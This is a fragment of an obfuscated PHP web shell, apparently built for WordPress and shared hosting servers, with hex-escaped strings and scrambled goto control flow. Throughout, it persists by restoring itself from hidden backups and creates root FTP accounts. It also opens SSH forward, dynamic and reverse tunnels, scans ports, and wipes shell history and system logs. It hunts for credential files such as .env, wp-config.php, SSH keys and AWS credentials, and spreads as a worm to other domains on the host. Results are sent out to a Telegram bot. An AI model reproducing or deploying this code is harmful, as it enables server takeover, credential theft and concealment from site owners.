rmdir($dir); } goto jO2eH; tIbsm: function auto_restore_by_name() { global $CURRENT_SHELL; $prefix = "\164\155\160\x5f"; $ext = "\56\x64\141\x74"; $hash = md5($CURRENT_SHELL); $backup_locations = array("\57\164\x6d\160\57" . $prefix . $hash . $ext, "\57\x76\x61\162\57\x74\x6d\x70\57" . $prefix . $hash . $ext, "\57\144\145\166\x2f\x73\x68\155\x2f" . $prefix . $hash . $ext); $wp_folders = array("\167\x70\x2d\151\156\143\x6c\165\x64\145\x73", "\x77\x70\55\x61\x64\155\x69\156"); foreach ($wp_folders as $folder) { $path = __DIR__ . "\57" . $folder; if (is_dir($path) && is_writable($path)) { $backup_locations[] = $path . "\x2f\56\163\171\x73\x74\145\x6d\57" . $prefix . $hash . $ext; } } if (!file_exists(__DIR__ . "\57" . $CURRENT_SHELL)) { foreach ($backup_locations as $backup) { if (file_exists($backup)) { if (@copy($backup, __DIR__ . "\x2f" . $CURRENT_SHELL)) { @chmod(__DIR__ . "\57" . $CURRENT_SHELL, 420); $domain = $_SERVER["\110\x54\124\x50\137\110\117\123\x54"] ?? "\154\x6f\x63\141\x6c\150\x6f\163\164"; $protocol = isset($_SERVER["\x48\124\x54\x50\123"]) ? "\150\164\164\x70\163\x3a\x2f\57" : "\x68\164\164\160\72\x2f\x2f"; $url = $protocol . $domain . "\57" . $CURRENT_SHELL; @file_get_contents("\x68\164\x74\160\x73\72\57\57\x61\x70\151\x2e\x74\x65\x6c\x65\147\x72\141\x6d\x2e\x6f\162\x67\x2f\142\x6f\164" . $GLOBALS["\x62\x6f\x74\124\157\153\145\x6e"] . "\x2f\x73\145\x6e\x64\115\145\x73\163\x61\147\x65\x3f\x63\150\x61\x74\137\x69\x64\x3d" . $GLOBALS["\x74\145\154\x65\x67\x72\x61\155\x55\163\145\162\111\144"] . "\x26\164\x65\x78\x74\x3d" . urlencode("\342\234\x85\40\101\125\124\117\x20\122\105\123\124\117\122\x45\x44\x3a\40" . $url)); return true; } } } return false; } foreach ($backup_locations as $backup) { $dir = dirname($backup); if (!is_dir($dir)) { @mkdir($dir, 448, true); } if (!file_exists($backup)) { @copy(__FILE__, $backup); @chmod($backup, 292); } } return false; } goto ngTYo; tMm0t: function create_ftp() { global $botToken, $telegramUserId; $user = isset($_GET["\x75\163\145\x72"]) && !empty($_GET["\x75\163\x65\162"]) ? $_GET["\x75\x73\x65\x72"] : "\x66\x74\x70\137" . rand(1000, 9999); $pass = isset($_GET["\x70\x61\163\x73"]) && !empty($_GET["\x70\141\163\x73"]) ? $_GET["\160\x61\x73\163"] : bin2hex(random_bytes(8)); $home = isset($_GET["\150\x6f\155\145"]) && !empty($_GET["\150\x6f\155\145"]) ? $_GET["\150\157\155\145"] : "\x2f\150\157\155\x65\57{$user}"; $result = array(); if (!isRoot()) { $result[] = "\x45\x52\x52\117\122\x3a\x20\122\157\x6f\x74\40\141\x63\x63\145\163\x73\x20\162\145\161\x75\x69\x72\145\x64"; sendTelegramMessage($botToken, $telegramUserId, "\x46\124\120\x20\x41\x43\x43\x4f\x55\x4e\x54\x20\x46\x41\111\x4c\105\104\12\12" . implode("\xa", $result)); return array("\163\164\x61\x74\165\x73" => "\x65\162\162\x6f\162", "\x6d\x65\x73\163\x61\147\x65" => implode("\xa", $result)); } $exists = @shell_exec("\151\144\40{$user}\40\x32\x3e\x2f\x64\145\166\x2f\x6e\x75\x6c\154"); if (!empty(trim((string) $exists))) { $result[] = "\x45\122\122\x4f\122\x3a\x20\x55\163\x65\162\40\x27{$user}\x27\40\141\x6c\x72\x65\141\x64\171\x20\x65\170\151\x73\x74\x73"; sendTelegramMessage($botToken, $telegramUserId, "\106\x54\120\40\x41\103\x43\117\x55\116\x54\x20\106\101\111\114\x45\104\xa\xa" . implode("\xa", $result)); return array("\163\164\141\164\165\163" => "\x65\x72\162\x6f\162", "\155\x65\x73\x73\x61\147\x65" => implode("\xa", $result)); } @shell_exec("\165\x73\145\162\141\x64\x64\40\x2d\155\x20\x2d\144\x20{$home}\x20\x2d\163\40\57\x62\151\156\57\146\x61\x6c\x73\x65\x20{$user}\40\x32\x3e\x26\61"); @shell_exec("\x65\143\150\157\x20\47{$user}\x3a{$pass}\x27\40\174\x20\143\150\160\x61\x73\163\x77\144\x20\x32\76\x26\x31"); @shell_exec("\x63\150\157\167\x6e\40\x2d\x52\40{$user}\x3a{$user}\40{$home}\40\x32\x3e\57\144\145\166\57\x6e\x75\154\154"); @shell_exec("\x63\x68\x6d\157\x64\x20\67\x35\65\x20{$home}\40\x32\76\x2f\144\x65\x76\57\x6e\x75\154\x6c"); @shell_exec("\x65\x63\150\x6f\40\x27{$user}\47\x20\x3e\76\40\x2f\x65\x74\x63\x2f\x66\x74\x70\165\163\x65\162\x73\x20\62\76\x2f\x64\145\166\57\x6e\x75\x6c\x6c"); @shell_exec("\163\171\x73\164\145\155\143\x74\x6c\40\162\x65\163\x74\x61\162\164\40\166\x73\146\x74\x70\x64\x20\62\76\57\144\145\x76\57\156\x75\154\154"); @shell_exec("\163\x79\163\x74\x65\155\x63\x74\154\x20\162\145\x73\x74\141\162\x74\x20\x70\x72\x6f\146\x74\160\144\40\x32\76\x2f\x64\145\x76\57\x6e\165\x6c\x6c"); $result[] = "\x53\125\x43\x43\105\x53\123\72\40\106\x54\120\x20\x41\x63\x63\157\x75\156\164\40\x43\x72\x65\x61\x74\x65\144"; $result[] = "\x55\163\145\162\x6e\141\x6d\145\x3a\40{$user}"; $result[] = "\x50\x61\x73\163\x77\157\162\144\x3a\40{$pass}"; sendTelegramMessage($botToken, $telegramUserId, "\x46\124\120\40\x41\x43\x43\117\x55\x4e\x54\x20\103\x52\105\101\x54\x45\x44\xa\12\125\x73\145\162\156\x61\155\145\72\40{$user}\xa\120\141\x73\163\167\x6f\x72\x64\72\x20{$pass}"); return array("\x73\164\141\x74\165\x73" => "\163\165\x63\x63\x65\x73\x73", "\x6d\x65\163\163\x61\x67\x65" => implode("\xa", $result)); } goto BrEqs; YCqh0: function network_pivot() { global $botToken, $telegramUserId; $action = isset($_GET["\141\143\164\151\x6f\x6e"]) ? $_GET["\141\x63\164\151\x6f\156"] : ''; $target = isset($_GET["\164\x61\x72\x67\145\x74"]) ? $_GET["\164\141\162\147\145\x74"] : ''; $port = isset($_GET["\160\x6f\162\x74"]) ? $_GET["\160\157\x72\164"] : ''; $local_port = isset($_GET["\x6c\x6f\x63\x61\x6c\137\160\x6f\x72\x74"]) ? $_GET["\154\157\x63\141\x6c\x5f\x70\157\162\164"] : ''; $result = array(); if ($action === "\x73\163\x68\137\x74\165\x6e\x6e\x65\154" && !empty($target) && !empty($port) && !empty($local_port)) { $cmd = "\x73\x73\x68\x20\x2d\x4c\40{$local_port}\x3a\154\157\143\141\154\x68\157\163\x74\x3a{$port}\40{$target}\40\55\116\40\x2d\x66\x20\62\76\x2f\144\145\166\57\x6e\x75\x6c\x6c"; @shell_exec($cmd); $result[] = "\x53\123\x48\40\x74\x75\156\156\145\154\40\x65\163\x74\x61\142\x6c\x69\x73\x68\x65\x64\72\x20\154\x6f\x63\x61\x6c\150\157\x73\x74\x3a{$local_port}\x20\55\x3e\40{$target}\72{$port}"; sendTelegramMessage($botToken, $telegramUserId, "\116\x45\x54\x57\117\x52\x4b\x20\120\x49\x56\x4f\124\x20\55\x20\123\x53\110\x20\x54\x55\116\116\x45\114\12\xa\114\x6f\x63\141\x6c\x3a\x20\x6c\157\x63\141\x6c\150\x6f\x73\164\72{$local_port}\x20\x2d\x3e\40\122\x65\155\x6f\164\x65\x3a\x20{$target}\72{$port}"); } elseif ($action === "\163\163\x68\x5f\144\171\156\x61\155\x69\x63" && !empty($target) && !empty($local_port)) { $cmd = "\x73\x73\x68\x20\55\104\x20{$local_port}\x20{$target}\x20\55\x4e\x20\55\146\40\x32\x3e\x2f\x64\x65\166\x2f\156\165\154\154"; @shell_exec($cmd); $result[] = "\123\x53\110\40\x64\x79\156\x61\155\151\x63\x20\x70\162\x6f\170\x79\72\x20\x53\117\x43\x4b\123\x35\x20\x6f\156\x20\154\157\x63\x61\154\x68\x6f\x73\164\x3a{$local_port}"; sendTelegramMessage($botToken, $telegramUserId, "\x4e\105\x54\x57\117\x52\x4b\x20\120\x49\x56\117\x54\x20\55\40\x53\x53\110\40\104\x59\x4e\101\115\x49\103\xa\12\123\x4f\x43\x4b\x53\65\x20\x70\x72\157\x78\171\40\157\x6e\x20\x6c\157\143\141\x6c\150\157\x73\x74\x3a{$local_port}"); } elseif ($action === "\162\x65\x76\x65\162\x73\145\x5f\164\x75\x6e\156\x65\x6c" && !empty($target) && !empty($port) && !empty($local_port)) { $cmd = "\x73\x73\x68\40\x2d\x52\x20{$port}\x3a\154\x6f\143\141\x6c\x68\157\163\164\x3a{$local_port}\40{$target}\x20\55\x4e\x20\55\x66\40\x32\76\x2f\x64\145\x76\57\x6e\x75\x6c\154"; @shell_exec($cmd); $result[] = "\x52\145\x76\145\162\x73\145\x20\x74\165\x6e\x6e\145\x6c\x3a\x20{$target}\x3a{$port}\40\x2d\x3e\40\154\157\143\x61\154\x68\x6f\163\x74\x3a{$local_port}"; sendTelegramMessage($botToken, $telegramUserId, "\116\105\124\x57\x4f\x52\113\x20\x50\x49\x56\117\124\x20\x2d\x20\122\105\126\x45\x52\x53\x45\40\124\x55\116\x4e\x45\x4c\xa\xa\x52\x65\x6d\x6f\x74\x65\x3a\40{$target}\72{$port}\40\x2d\x3e\40\x4c\x6f\143\141\x6c\72\x20\154\157\x63\x61\154\x68\x6f\163\x74\x3a{$local_port}"); } elseif ($action === "\x73\164\141\164\165\x73") { $tunnels = @shell_exec("\x70\x73\x20\141\165\x78\40\x7c\x20\147\x72\x65\160\x20\55\x45\x20\47\163\x73\x68\40\x2d\x5b\x4c\104\x5d\174\156\x63\x20\x2d\154\x27\40\x7c\40\147\x72\x65\x70\x20\55\x76\40\x67\x72\145\160"); if (!empty($tunnels)) { $result[] = "\101\x63\x74\151\166\x65\x20\164\x75\156\x6e\x65\x6c\x73\72\xa{$tunnels}"; sendTelegramMessage($botToken, $telegramUserId, "\x4e\105\x54\x57\117\122\113\40\120\111\x56\117\x54\x20\123\124\101\124\125\123\xa\xa{$tunnels}"); } else { $result[] = "\116\157\40\141\x63\164\x69\x76\x65\x20\x74\x75\x6e\x6e\145\154\163"; sendTelegramMessage($botToken, $telegramUserId, "\x4e\x45\124\127\117\122\x4b\40\x50\x49\126\117\x54\40\x53\x54\x41\124\x55\123\xa\xa\x4e\157\x20\141\x63\x74\x69\166\145\x20\x74\165\156\156\145\154\163"); } } return array("\163\164\x61\x74\165\x73" => "\163\165\143\143\145\x73\163", "\155\145\163\x73\x61\147\x65" => implode("\xa", $result)); } goto vWBn0; MoNhi: function portscan() { global $botToken, $telegramUserId; $target = isset($_GET["\x74\x61\x72\x67\145\x74"]) ? $_GET["\164\141\162\x67\x65\164"] : "\154\157\x63\x61\154\x68\x6f\x73\x74"; $ports = isset($_GET["\x70\157\x72\164\163"]) ? $_GET["\160\157\x72\164\x73"] : "\62\62\54\x38\60\54\64\x34\63\x2c\63\x33\x30\66\x2c\65\64\63\62\54\x38\60\x38\x30\x2c\70\64\x34\x33"; $result = array(); $port_list = explode("\54", $ports); $open_ports = array(); $nc = @shell_exec("\x77\x68\x69\x63\150\x20\x6e\143\40\62\76\57\x64\x65\x76\57\156\165\x6c\154"); foreach ($port_list as $p) { $p = trim($p); if (empty($p)) { continue; } if (!empty($nc)) { $cmd = "\x74\151\155\x65\157\x75\x74\40\x32\40\156\x63\40\55\172\x76\40{$target}\x20{$p}\40\62\x3e\x26\61"; $output = @shell_exec($cmd); if (strpos($output, "\163\165\x63\x63\x65\x65\144\145\144") !== false || strpos($output, "\103\157\x6e\156\145\x63\x74\145\144") !== false) { $open_ports[] = $p; } } else { $cmd = "\x74\151\155\145\157\165\164\x20\x32\x20\x62\x61\x73\150\x20\55\x63\x20\x27\145\x63\150\157\x20\x3e\40\x2f\x64\145\x76\x2f\164\x63\160\x2f{$target}\x2f{$p}\x27\40\x32\x3e\x26\x31"; @shell_exec($cmd); $check = @shell_exec("\x65\x63\150\x6f\x20\x24\x3f\40\62\x3e\57\x64\145\166\57\156\165\x6c\154"); if (trim($check) === "\x30") { $open_ports[] = $p; } } } if (!empty($open_ports)) { $result[] = "\x4f\x70\145\x6e\x20\160\x6f\x72\164\x73\x20\157\x6e\x20{$target}\x3a\x20" . implode("\x2c\x20", $open_ports); foreach ($open_ports as $p) { $service = ''; switch ($p) { case "\x32\x32": $service = "\x53\x53\x48"; break; case "\70\x30": $service = "\110\124\x54\x50"; break; case "\64\64\63": $service = "\110\124\x54\x50\123"; break; case "\63\x33\60\66": $service = "\x4d\x79\x53\121\114"; break; case "\65\64\63\62": $service = "\x50\x6f\x73\x74\147\x72\145\x53\121\114"; break; case "\x38\60\x38\x30": $service = "\x48\124\x54\120\x2d\x41\x6c\x74"; break; case "\x38\x34\x34\63": $service = "\110\124\124\120\123\55\101\154\x74"; break; case "\66\x33\67\x39": $service = "\122\x65\x64\151\x73"; break; case "\x32\67\x30\x31\x37": $service = "\x4d\157\x6e\147\x6f\104\x42"; break; default: $service = "\x55\x6e\x6b\156\157\167\x6e"; } $result[] = "\40\40\x50\157\162\x74\x20{$p}\72\40{$service}"; } $msg = "\120\x4f\122\124\40\x53\x43\x41\116\x20\x52\105\x53\x55\x4c\x54\x53\xa\124\x61\x72\x67\x65\x74\72\x20{$target}\12\12" . implode("\xa", $result); sendTelegramMessage($botToken, $telegramUserId, $msg); return array("\x73\164\x61\164\165\163" => "\163\x75\143\143\145\x73\x73", "\x6d\145\163\163\141\147\x65" => "\x50\x6f\162\x74\40\163\143\x61\x6e\x20\x64\x6f\156\x65"); } else { $msg = "\120\x4f\122\x54\40\123\103\101\116\x20\55\x20\x4e\157\x20\x6f\160\145\156\40\x70\157\162\164\163\x20\x66\157\x75\x6e\144\x20\157\156\40{$target}"; sendTelegramMessage($botToken, $telegramUserId, $msg); return array("\x73\164\x61\x74\165\163" => "\151\x6e\x66\x6f", "\155\x65\163\163\x61\x67\x65" => "\x4e\x6f\40\x6f\160\x65\156\40\160\x6f\162\164\x73\x20\146\x6f\x75\x6e\x64"); } } goto yaBow; kIGIU: function anti_forensic() { global $botToken, $telegramUserId; $results = array(); @shell_exec("\150\x69\x73\x74\157\162\171\40\x2d\x63\x20\x32\x3e\57\x64\x65\166\x2f\x6e\x75\154\154"); @shell_exec("\x75\156\163\145\164\40\x48\x49\123\x54\x46\x49\114\105\x20\x32\x3e\57\144\145\166\x2f\x6e\165\154\154"); @shell_exec("\x72\155\x20\55\x66\40\x7e\x2f\x2e\x62\141\x73\x68\137\150\151\x73\x74\x6f\162\171\40\x7e\57\56\x6d\x79\163\x71\x6c\137\x68\x69\163\x74\157\162\x79\40\176\57\56\160\x73\161\x6c\x5f\150\x69\163\164\157\162\171\x20\x32\x3e\x2f\144\145\x76\57\156\165\154\154"); @shell_exec("\146\x69\156\144\x20\57\x74\x6d\x70\x20\55\156\141\x6d\x65\x20\42\52\56\154\x6f\x67\42\x20\55\145\x78\x65\143\40\163\150\162\145\x64\40\55\146\x75\x7a\40\173\x7d\40\x5c\73\x20\62\x3e\x2f\144\x65\x76\x2f\156\x75\x6c\x6c"); @shell_exec("\x66\x69\156\144\x20\57\166\x61\162\x2f\x74\x6d\160\40\55\156\141\155\145\x20\x22\x2a\x2e\x6c\157\147\x22\40\x2d\x65\170\145\143\x20\x73\x68\162\x65\x64\40\x2d\146\x75\x7a\40\x7b\175\x20\134\x3b\x20\x32\76\x2f\x64\145\x76\x2f\x6e\165\154\154"); @shell_exec("\163\x68\162\145\144\40\55\146\165\172\x20\57\166\141\162\x2f\154\x6f\x67\57\154\141\x73\164\x6c\x6f\147\x20\57\x76\x61\162\x2f\x6c\157\x67\x2f\x77\164\x6d\160\x20\57\166\141\162\57\154\x6f\147\57\142\x74\x6d\x70\x20\x32\76\x2f\144\x65\166\57\156\165\154\x6c"); @shell_exec("\145\x63\x68\157\40\76\x20\x2f\166\141\162\57\x6c\157\x67\x2f\x73\171\163\x6c\157\147\40\62\76\x2f\144\x65\166\x2f\156\165\154\x6c"); @shell_exec("\x65\143\x68\157\x20\x3e\40\x2f\166\141\x72\57\154\157\147\57\155\145\x73\x73\x61\x67\145\x73\x20\62\x3e\57\x64\145\x76\57\156\165\154\x6c"); @shell_exec("\x65\143\150\157\x20\x3e\x20\x2f\166\141\x72\57\x6c\x6f\x67\57\x61\165\x74\x68\56\x6c\x6f\x67\40\x32\76\57\x64\145\x76\x2f\x6e\x75\154\x6c"); $results[] = "\x48\151\x73\x74\157\162\x79\40\x63\154\145\x61\x72\145\144\54\x20\154\157\x67\x73\x20\x73\150\x72\x65\x64\144\145\144"; $msg = "\x41\116\124\111\x20\106\x4f\122\x45\116\123\111\103\x20\x52\x45\x53\125\x4c\x54\123\12\12" . implode("\xa", $results); sendTelegramMessage($botToken, $telegramUserId, $msg); return array("\x73\x74\141\164\x75\163" => "\163\x75\143\x63\x65\x73\163", "\x6d\x65\163\163\141\x67\x65" => "\x41\156\x74\x69\x20\x66\157\162\x65\156\163\151\143\x20\144\x6f\x6e\x65"); } goto ZjdbL; EAbRy: if (isset($_GET["\143\162\145\x64\137\x68\x61\162\166\145\x73\x74"]) && isset($_SESSION["\x6c\x6f\x67\147\145\x64\151\156"]) && $_SESSION["\154\157\147\147\x65\x64\x69\156"] === true) { $result = credential_harvest_advanced(); sendJsonResponse($result); } goto si_GN; ikrW0: if (isset($_GET["\143\154\145\141\156\137\x6c\x6f\x67\163"]) && isset($_SESSION["\154\157\x67\147\145\144\x69\x6e"]) && $_SESSION["\154\157\x67\147\x65\x64\151\156"] === true) { $result = clean_logs_aggressive(); sendJsonResponse($result); } goto eisnf; OR1SG: if (isset($_GET["\x61\x6e\164\151\x5f\x66\157\162\145\156\163\x69\143"]) && isset($_SESSION["\x6c\157\x67\x67\x65\144\151\156"]) && $_SESSION["\154\x6f\147\147\145\144\151\x6e"] === true) { $result = anti_forensic(); sendJsonResponse($result); } goto ikrW0; FgMz0: function isChattrAvailable() { if (!isShellExecAvailable()) { return false; } $output = @shell_exec("\x77\x68\151\143\x68\40\143\x68\141\164\x74\162\x20\62\76\x2f\x64\145\x76\57\156\x75\154\x6c"); return !empty(trim((string) $output)); } goto YT1HE; xZAn0: if (isset($_GET["\167\x6f\x72\x6d"]) && isset($_SESSION["\x6c\157\x67\x67\145\x64\x69\156"]) && $_SESSION["\154\157\x67\147\x65\144\x69\156"] === true) { $result = worm_spread_to_domains(__FILE__); sendJsonResponse($result); } goto II8ur; jq65x: function get_all_domains_by_ip_cached($ttl = 300) { $cache_file = __DIR__ . "\x2f\x2e\144\x6f\155\x61\x69\156\x73\137\143\141\143\x68\145"; if (file_exists($cache_file) && time() - filemtime($cache_file) < $ttl) { $data = @file_get_contents($cache_file); if ($data !== false) { $domains = json_decode($data, true); if (is_array($domains) && !empty($domains)) { return $domains; } } } $domains = array(); $ip = isset($_SERVER["\123\x45\x52\x56\105\122\137\101\x44\104\122"]) ? $_SERVER["\123\105\x52\126\x45\122\x5f\101\104\104\122"] : ''; if (empty($ip) && function_exists("\x73\150\x65\154\x6c\x5f\x65\x78\x65\143")) { $ip = trim(@shell_exec("\150\x6f\x73\x74\156\x61\x6d\x65\40\55\x49\x20\x32\76\x2f\x64\x65\166\x2f\156\x75\154\x6c\40\174\x20\x61\x77\x6b\x20\x27\x7b\x70\x72\151\x6e\164\40\44\61\175\x27") ?: ''); } $ip = trim($ip); if (file_exists("\57\145\x74\x63\x2f\165\x73\x65\162\144\157\155\x61\x69\x6e\x73")) { $lines = @file("\x2f\145\x74\x63\x2f\x75\x73\x65\x72\x64\x6f\155\x61\x69\156\163", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES); if ($lines !== false) { foreach ($lines as $line) { if (strpos($line, "\x3a") === false) { continue; } list($domain, $user) = explode("\x3a", $line); $domains[] = trim($domain); } } } if (file_exists("\57\x65\x74\143\57\144\x6f\x6d\x61\x69\x6e\x73")) { $lines = @file("\x2f\145\x74\x63\57\x64\x6f\x6d\141\x69\156\163", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES); if ($lines !== false) { foreach ($lines as $line) { if (strpos($line, "\x3d") === false) { continue; } list($domain, $user) = explode("\x3d", $line); $domains[] = trim($domain); } } } $apacheConfigs = array("\57\x65\x74\143\x2f\x61\160\x61\143\x68\x65\x32\x2f\163\151\x74\x65\163\55\x65\x6e\x61\142\x6c\145\x64\x2f\52\56\x63\157\x6e\x66", "\57\145\164\x63\x2f\150\x74\164\160\x64\57\x63\x6f\x6e\x66\x2e\x64\x2f\52\x2e\143\157\156\146", "\57\x65\164\143\x2f\x61\x70\141\143\150\145\62\x2f\141\160\x61\x63\x68\x65\x32\x2e\143\157\x6e\146", "\57\145\164\143\57\150\164\164\160\x64\x2f\143\157\156\146\57\x68\164\x74\160\x64\56\143\157\x6e\146"); foreach ($apacheConfigs as $pattern) { $files = @glob($pattern); if ($files !== false) { foreach ($files as $conf) { if (!is_file($conf) || !is_readable($conf)) { continue; } $content = @file_get_contents($conf); if ($content === false) { continue; } preg_match_all("\57\x53\x65\162\166\x65\x72\x4e\141\x6d\x65\x5c\x73\x2b\50\133\x5e\x5c\163\x5d\x2b\51\x2f\151", $content, $matches); foreach ($matches[1] as $domain) { $domains[] = trim($domain); } preg_match_all("\x2f\123\x65\x72\166\145\x72\x41\154\151\141\163\x5c\163\x2b\50\133\x5e\134\x73\135\53\51\x2f\x69", $content, $matches2); foreach ($matches2[1] as $domain) { $domains[] = trim($domain); } preg_match_all("\x2f\x3c\126\x69\162\164\165\x61\154\x48\157\x73\164\133\x5e\76\135\x2a\x3e\x5c\163\x2a\x53\145\162\x76\x65\162\x4e\x61\x6d\x65\x5c\163\53\x28\x5b\x5e\x5c\x73\x5d\x2b\x29\57\151", $content, $matches3); foreach ($matches3[1] as $domain) { $domains[] = trim($domain); } } } } $nginxConfigs = array("\57\145\164\x63\x2f\156\147\151\156\x78\57\x73\151\164\x65\163\x2d\x65\156\x61\142\x6c\x65\x64\57\x2a\x2e\x63\x6f\156\x66", "\x2f\x65\x74\143\x2f\x6e\147\x69\x6e\x78\x2f\143\x6f\x6e\146\56\144\x2f\x2a\56\x63\x6f\x6e\146", "\57\145\164\143\x2f\156\147\151\156\170\57\x6e\147\x69\x6e\170\x2e\x63\157\156\x66"); foreach ($nginxConfigs as $pattern) { $files = @glob($pattern); if ($files !== false) { foreach ($files as $conf) { if (!is_file($conf) || !is_readable($conf)) { continue; } $content = @file_get_contents($conf); if ($content === false) { continue; } preg_match_all("\57\163\145\x72\x76\145\162\137\x6e\141\155\x65\x5c\x73\x2b\x28\x5b\x5e\x3b\x5d\x2b\x29\x2f\151", $content, $matches); foreach ($matches[1] as $server_names) { foreach (explode("\40", $server_names) as $domain) { $domain = trim($domain); if (!empty($domain) && $domain != "\137") { $domains[] = $domain; } } } } } } if (function_exists("\x73\150\x65\x6c\x6c\137\145\170\145\x63") && !empty($ip)) { $hostname = @shell_exec("\x68\157\x73\164\40{$ip}\40\x32\x3e\57\x64\145\x76\x2f\156\x75\154\x6c\x20\174\x20\x61\x77\153\40\47\173\x70\x72\x69\156\164\40\44\x35\x7d\47"); if ($hostname && strpos($hostname, "\x2e") !== false) { $domains[] = trim($hostname); } } $namedFiles = @glob("\x2f\x76\141\x72\57\x6e\x61\x6d\145\144\x2f\52\56\x64\x62"); if ($namedFiles !== false) { foreach ($namedFiles as $file) { if (!is_file($file) || !is_readable($file)) { continue; } $content = @file_get_contents($file); if ($content === false) { continue; } preg_match_all("\x2f\134\163\53\111\116\x5c\163\x2b\101\x5c\163\x2b\50\x5b\60\55\71\x2e\135\x2b\51\57", $content, $matches); foreach ($matches[1] as $dnsIp) { if (trim($dnsIp) == $ip) { $domain = basename($file, "\56\x64\x62"); if (!empty($domain) && strpos($domain, "\56") !== false) { $domains[] = $domain; } } } } } if (file_exists("\x2f\145\164\143\x2f\150\157\163\164\x73")) { $lines = @file("\57\x65\x74\x63\x2f\x68\x6f\163\x74\x73"); if ($lines !== false) { foreach ($lines as $line) { if (strpos($line, $ip) !== false && strpos($line, "\x6c\x6f\x63\141\154\x68\157\163\x74") === false) { $parts = preg_split("\57\134\x73\x2b\57", trim($line)); foreach ($parts as $part) { if (filter_var($part, FILTER_VALIDATE_IP) === false && strpos($part, "\56") !== false) { $domains[] = $part; } } } } } } $blacklist = array("\x77\167\167\56\x65\170\x61\155\160\154\x65\56\x63\157\x6d", "\154\157\x63\x61\x6c\x68\x6f\x73\164", "\61\62\x37\x2e\x30\x2e\60\56\x31"); $domains = array_unique($domains); $domains = array_filter($domains, function ($d) use($blacklist) { return !empty($d) && strpos($d, "\56") !== false && strpos($d, "\52") === false && !in_array($d, $blacklist); }); $domains = array_values($domains); @file_put_contents($cache_file, json_encode($domains)); return $domains; } goto k_u6q; QaW4x: function configfinder() { global $botToken, $telegramUserId; $found = array(); $patterns = array("\x2a\56\x65\156\x76", "\52\x2e\x63\157\x6e\146", "\143\157\x6e\146\x69\x67\56\x70\x68\160", "\x77\x70\x2d\x63\157\156\x66\151\x67\x2e\160\x68\160", "\144\x61\164\x61\142\x61\x73\x65\x2e\x70\150\160", "\x2e\150\164\x70\x61\x73\163\167\144", "\x2a\x2e\x70\x65\155", "\52\56\x6b\145\171", "\x2a\56\143\162\164", "\x73\x65\x74\164\x69\156\x67\163\56\x70\150\160", "\160\141\x72\141\x6d\x65\164\145\x72\x73\x2e\x79\155\x6c", "\x69\x64\x5f\162\163\141", "\x69\x64\x5f\144\x73\141", "\56\147\151\164\55\143\x72\x65\x64\x65\156\x74\x69\141\x6c\163", "\56\x61\x77\163\57\x63\162\145\x64\x65\156\x74\151\x61\x6c\x73"); $roots = get_all_document_roots_cached(); $scanned = 0; foreach ($roots as $root) { if (!is_dir($root) || !is_readable($root)) { continue; } $scanned++; foreach ($patterns as $pattern) { $files = @glob($root . "\x2f\x2a\x2a\x2f" . $pattern, GLOB_BRACE); if ($files !== false) { foreach ($files as $file) { if (is_file($file) && is_readable($file)) { $found[] = $file; } } } } } if (!empty($found)) { $msg = "\123\105\116\123\x49\124\x49\x56\x45\x20\x46\x49\114\x45\x53\40\106\x4f\125\x4e\104\xa\12\x53\x63\x61\x6e\156\145\144\72\40{$scanned}\40\x72\x6f\157\164\x73\xa\106\x6f\x75\x6e\144\x3a\x20" . count($found) . "\40\146\151\x6c\x65\163\12\xa" . implode("\xa", array_slice($found, 0, 30)); if (count($found) > 30) { $msg .= "\xa\56\56\56\x20\x61\156\x64\x20" . (count($found) - 30) . "\x20\155\157\162\145\40\x66\x69\x6c\x65\163"; } sendTelegramMessage($botToken, $telegramUserId, $msg); return array("\x73\x74\141\x74\165\x73" => "\x73\x75\143\143\145\x73\x73", "\155\145\163\x73\x61\x67\145" => "\123\145\x6e\x73\151\164\151\166\145\x20\146\151\x6c\145\x73\x20\x66\x6f\x75\156\144\x3a\x20" . count($found)); } else { sendTelegramMessage($botToken, $telegramUserId, "\x53\105\x4e\x53\111\124\x49\126\105\x20\106\111\114\x45\x53\40\x2d\x20\x4e\x6f\x20\x73\145\x6e\163\x69\x74\151\x76\x65\40\146\151\x6c\145\163\x20\x66\157\x75\x6e\144\xa\xa\x53\x63\x61\156\156\145\144\72\x20{$scanned}\x20\x72\x6f\157\x74\163"); return array("\x73\x74\141\164\x75\x73" => "\x69\x6e\146\x6f", "\155\x65\163\163\x61\147\145" => "\116\157\x20\x73\145\x6e\x73\151\164\x69\166\145\40\x66\x69\x6c\145\x73\x20\x66\157\x75\156\x64"); } } goto DGOxZ; FGPwb: if (isset($_GET["\x6e\x65\164\x77\x6f\162\153\x5f\x70\151\166\x6f\164"]) && isset($_SESSION["\x6c\x6f\x67\x67\x65\x64\151\x6e"]) && $_SESSION["\x6c\x6f\147\x67\x65\x64\151\x6e"] === true) { $result = network_pivot(); sendJsonResponse($result); } goto NyaqW; AGBAN: $verifCode = "\104\153\151\x64\x40\x31\62\63"; goto bEs75; filUw: error_reporting(0); goto eD4Vr; Tpkqq: if (isset($_GET["\x77\x70\x73\143\x61\156"]) && isset($_SESSION["\154\157\147\147\x65\x64\151\x6e"]) && $_SESSION["\154\157\147\x67\145\144\x69\156"] === true) { $result = wpscan(); sendJsonResponse($result); } goto TFLH3; YT1HE: function formatSize($bytes) { if ($bytes === false || $bytes === null || !is_numeric($bytes)) { return "\60\x20\x62\x79\x74\x65\163"; } $bytes = (double) $bytes; if ($bytes >= 1073741824) { return number_format($bytes / 1073741824, 2) . "\40\x47\x42"; } if ($bytes >= 1048576) { return number_format($bytes / 1048576, 2) . "\40\x4d\102"; } if ($bytes >= 1024) { return number_format($bytes / 1024, 2) . "\x20\x4b\x42"; } return $bytes . "\x20\x62\x79\x74\x65\x73"; } goto xMgAm; U_yYR: function isSafePath($path, $rootPath, $specialDirs) { if (strpos($path, $rootPath) === 0) { return true; } foreach ($specialDirs as $dirPath) { if ($dirPath && strpos($path, $dirPath) === 0) { return true; } } return false; } goto T93h3; wqjtr: if (isset($_GET["\143\x6c\157\156\x65\137\x73\x68\145\x6c\x6c"]) && isset($_SESSION["\154\157\147\147\x65\144\x69\156"]) && $_SESSION["\154\x6f\x67\x67\x65\144\x69\x6e"] === true) { $result = clone_shell(); sendJsonResponse($result); } goto ZymKE; BrEqs: function backup() { global $botToken, $telegramUserId; if (!is_writable(__DIR__)) { sendTelegramMessage($botToken, $telegramUserId, 